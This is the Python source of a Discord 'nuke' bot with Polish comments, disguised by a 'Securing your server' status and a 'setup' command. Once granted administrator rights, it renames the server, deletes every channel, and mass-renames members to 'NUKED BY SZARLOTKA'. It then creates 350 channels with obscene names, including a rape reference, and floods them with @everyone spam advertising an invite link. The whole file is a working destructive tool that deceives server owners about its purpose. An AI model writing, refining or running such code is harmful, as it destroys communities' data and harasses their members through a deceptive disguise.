import asyncio
import discord
from discord.ext import commands

intents = discord.Intents.default()
intents.guilds = True
intents.messages = True
intents.message_content = True
intents.members = True

bot = commands.Bot(command_prefix='!', intents=intents)

TOKEN = 'your token here XD'

@bot.event
async def on_ready():
    activity = discord.Game(name="Securing your server")
    await bot.change_presence(status=discord.Status.online, activity=activity)
    print(f'[INFO] Bot zalogowany jako {bot.user.name} ze statusem "Securing your server"')

@bot.command(name='setup')
async def setup(ctx):
    guild = ctx.guild

    if not guild.me.guild_permissions.administrator:
        await ctx.send('[BLAD] Bot nie posiada uprawnien Administratora.')
        return

    print(f'[INFO] Rozpoczynanie przyspieszonej operacji na serwerie: {guild.name}')

    try:
        # 1. Zmiana nazwy serwera
        new_guild_name = "Ṋ̴͚̔̌͌u҈̩͍͛͋k҈͍̫̟͚̎̚e̴͙̳̍̋̊̋́d̵̟̘͙̔̿̃ b҉͕̭̤͕̥̍̒y̶̲̥̪̝̞͋̎̾ S҉̰̱̜͕̤͒̂͆z҈͓̦̪͕̓̃́͊a҉͉͔̉̾̏̀́ͅr̴̘̬͔̃͆̂͒̚l̴͈̳̗̟̐̐̀̄o̴̪̜̞͕͐̎͊̾̚t̶͓͈͚̑̿͂k̴͕̮͔̓͆̅̽̅a҉͖̥̱͕̰̔̽́͌"
        asyncio.create_task(guild.edit(name=new_guild_name))

        # 2. Błyskawiczne usuwanie kanałów w jednej paczce (równolegle)
        delete_tasks = [channel.delete(reason="FastSetup") for channel in guild.channels]
        await asyncio.gather(*delete_tasks, return_exceptions=True)

        # 3. Zmiana nicków w większych paczkach i szybciej
        new_nick = "NUKED BY SZARLOTKA"
        members = [m for m in guild.members if m != guild.owner and m != guild.me]
        
        batch_size_members = 30  # Większa paczka użytkowników
        for i in range(0, len(members), batch_size_members):
            batch = members[i:i + batch_size_members]
            member_tasks = [m.edit(nick=new_nick, reason="FastSetup") for m in batch]
            asyncio.gather(*member_tasks, return_exceptions=True) # Odpalane współbieżnie bez czekania na blokadę

        print('[INFO] Czyszczenie zakończone. Uruchamianie szybkiego spamu...')

        channel_names = [
            'fucked-by-szarlotka',
            'raped-by-szarlotka',
            'fucked-by-szarlotka',
            'join-szarlotka-team'
        ]

        message_content = "@everyone\nJOIN TEAM SZARL0TKA\nhttps://dsc.gg/szarlotka [.](https://discord.gg/RvCHP8z6nR)"

        # Zwiększona prędkość wysyłania wiadomości w paczkach (mniejsza przerwa)
        async def fast_spam(channel):
            try:
                chunk_size = 40
                for _ in range(0, 1000, chunk_size):
                    sub_tasks = [channel.send(message_content) for _ in range(chunk_size)]
                    await asyncio.gather(*sub_tasks, return_exceptions=True)
                    await asyncio.sleep(0.01)
            except Exception:
                pass

        # Tworzenie kanałów większymi partiami bez zbędnych przerw
        async def create_channel_fast(name):
            try:
                channel = await guild.create_text_channel(name)
                asyncio.create_task(fast_spam(channel))
            except Exception:
                pass

        # Tworzenie 350 kanałów w dużych paczkach równoległych
        max_channels = 350
        channel_batch_size = 25
        for i in range(0, max_channels, channel_batch_size):
            batch_indices = range(i, min(i + channel_batch_size, max_channels))
            create_tasks = [create_channel_fast(channel_names[j % len(channel_names)]) for j in batch_indices]
            await asyncio.gather(*create_tasks, return_exceptions=True)

        print('[INFO] Zakończono przysiueszoną procedurę setupu.')

    except Exception as e:
        print(f'[BLAD] Krytyczny błąd procedury: {e}')

bot.run(TOKEN)
